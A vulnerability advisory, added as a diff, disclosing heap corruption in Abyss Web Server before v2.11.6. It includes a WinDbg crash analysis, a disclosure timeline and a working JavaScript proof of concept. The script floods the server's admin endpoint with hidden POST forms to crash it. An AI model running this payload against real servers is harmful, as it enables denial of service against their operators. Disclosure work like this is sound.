@@ -1,0 +1,266 @@
+[+] Credits: John Page (aka HyP3rlinX)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ABYSS-WEB-SERVER-MEMORY-HEAP-CORRUPTION.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==========
+aprelium.com
+
+
+
+Product:
+===========
+Abyss Web Server < v2.11.6
+
+
+
+Vulnerability Type:
+===================
+Memory Heap Corruption
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Security Issue:
+================
+Possible to corrupt heap memory of the Abyss Web Server by sending specially crafted HTML in repeated HTTP POST requests.
+Users should upgrade to latest version v2.11.6.
+
+
+GetUrlPageData2 (WinHttp) failed: 12002.
+
+FAULTING_IP: 
+msvcrt!memcpy+5a
+75e49b60 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
+ExceptionAddress: 75e49b60 (msvcrt!memcpy+0x0000005a)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000000
+   Parameter[1]: 003b9000
+Attempt to read from address 003b9000
+
+CONTEXT:  00000000 -- (.cxr 0x0;r)
+eax=00000000 ebx=075c33f8 ecx=000efd46 edx=00000002 esi=075c33b8 edi=0651edb0
+eip=77670c52 esp=0651ea70 ebp=0651ea80 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ntdll!ZwGetContextThread+0x12:
+77670c52 83c404          add     esp,4
+
+PROCESS_NAME:  abyssws.exe
+
+ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_PARAMETER1:  00000000
+
+EXCEPTION_PARAMETER2:  003b9000
+
+READ_ADDRESS:  003b9000 
+
+FOLLOWUP_IP: 
+abyssws+413d9
+004413d9 59              pop     ecx
+
+NTGLOBALFLAG:  0
+
+APPLICATION_VERIFIER_FLAGS:  0
+
+APP:  abyssws.exe
+
+ANALYSIS_VERSION: 6.3.9600.17298 (debuggers(dbg).141024-1500) x86fre
+
+LAST_CONTROL_TRANSFER:  from 0043f840 to 75e49b60
+
+FAULTING_THREAD:  ffffffff
+
+BUGCHECK_STR:  APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_INVALID_POINTER_READ_PROBABLYEXPLOITABLE
+
+PRIMARY_PROBLEM_CLASS:  ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_PROBABLYEXPLOITABLE
+
+DEFAULT_BUCKET_ID:  ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_PROBABLYEXPLOITABLE
+
+STACK_TEXT:  
+777542a8 776cd9bc ntdll!RtlFreeHeap+0x64
+777542ac 75e498cd msvcrt!free+0xcd
+777542b0 004413d9 abyssws+0x413d9
+777542b4 004089d0 abyssws+0x89d0
+777542b8 0040a607 abyssws+0xa607
+777542bc 0040bd58 abyssws+0xbd58
+777542c0 0040cb5b abyssws+0xcb5b
+
+
+SYMBOL_STACK_INDEX:  2
+
+SYMBOL_NAME:  abyssws+413d9
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: abyssws
+
+IMAGE_NAME:  abyssws.exe
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  5807a3cb
+
+STACK_COMMAND:  dps 777542a8 ; kb
+
+FAILURE_BUCKET_ID:  ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_PROBABLYEXPLOITABLE_c0000005_abyssws.exe!Unknown
+
+BUCKET_ID:  APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_INVALID_POINTER_READ_PROBABLYEXPLOITABLE_abyssws+413d9
+
+ANALYSIS_SOURCE:  UM
+
+FAILURE_ID_HASH_STRING:  um:actionable_heap_corruption_heap_failure_block_not_busy_probablyexploitable_c0000005_abyssws.exe!unknown
+
+FAILURE_ID_HASH:  {0ba3122b-4351-5a85-a0ea-294a6ce77042}
+
+Followup: MachineOwner
+---------
+
+
+///////////////////////////////////////////////
+
+
+The stored exception information can be accessed via .ecxr.
+(2740.30b8): Access violation - code c0000005 (first/second chance not available)
+eax=00000000 ebx=075c33f8 ecx=000efd46 edx=00000002 esi=075c33b8 edi=0651edb0
+eip=77670c52 esp=0651ea70 ebp=0651ea80 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+ntdll!ZwGetContextThread+0x12:
+77670c52 83c404          add     esp,4
+0:011> !load winext/msec
+0:011> !exploitable
+
+!exploitable 1.6.0.0
+Exploitability Classification: PROBABLY_EXPLOITABLE
+Recommended Bug Title: Probably Exploitable - Read Access Violation on Block Data Move starting at msvcrt!memcpy+0x0000000000000250 (Hash=0xb1db8cd3.0x508907b2)
+
+This is a read access violation in a block data move, and is therefore classified as probably exploitable.
+
+?
+
+References:
+============
+https://aprelium.com/news/abws2-11-6.html
+
+
+
+Exploit/POC:
+=============
+Cause Heap Corruption in Abyss Server.
+
+<!DOCTYPE>
+<html>
+<body>
+<script>
+//Abyss Web Server Memory (heap) Corruption POC
+//Discover by hyp3rlinx
+//Error code: 0xc0000374 is STATUS_HEAP_CORRUPTION
+//0xc0000374 - heap has been corrupted.
+//=======================================
+window.onerror=function(){
+return true
+}
+</script>
+
+<script>
+var target='http://VICTIM-IP:9999/hosts/host@0/edit/ipcontrol';
+
+function mk_iframe_targets(f){
+var tmp = document.createElement('IFRAME')
+tmp.style='display:none'
+tmp.name='hidden-frame'+f
+return tmp
+}
+
+function mk_inputs(id,name,val){
+var input=document.createElement('INPUT')
+input.type='hidden'
+input.id=id
+input.name=name
+input.value=val
+return input
+}
+
+function mk_forms(name,f){
+var PAYLOAD='CORRUPT'
+var tmp = document.createElement('FORM')
+tmp.method='POST'
+tmp.action=target
+tmp.target='hidden-frame'+f
+tmp.name = name
+tmp.style='display:none'
+tmp.appendChild(mk_inputs('token'+f,'$$xxvxd',PAYLOAD))
+tmp.appendChild(mk_inputs('','/hosts/host@0/edit/ipcontrol/rules/rules.badd',PAYLOAD))
+
+return tmp
+}
+
+var NUM_FORMS=50
+var form_arr = new Array
+for(var f =0; f < NUM_FORMS; f++){
+
+ var ifrms = mk_iframe_targets(f)
+ document.body.appendChild(ifrms)
+ 
+ var aform=mk_forms('form'+f,f)
+ form_arr.push(aform)
+ 
+ document.body.appendChild( aform )
+ 
+}
+
+function engine0(){
+for(var i = 0; i< NUM_FORMS; i++){
+form_arr[i].submit()
+}
+}
+
+window.setInterval(engine0, 5)
+
+</script>
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=============================================
+Vendor Notification : September 21, 2017
+Vendor Acknowledgement : September 22, 2017
+Vendor Released New Version : November 30, 2017
+December 1, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
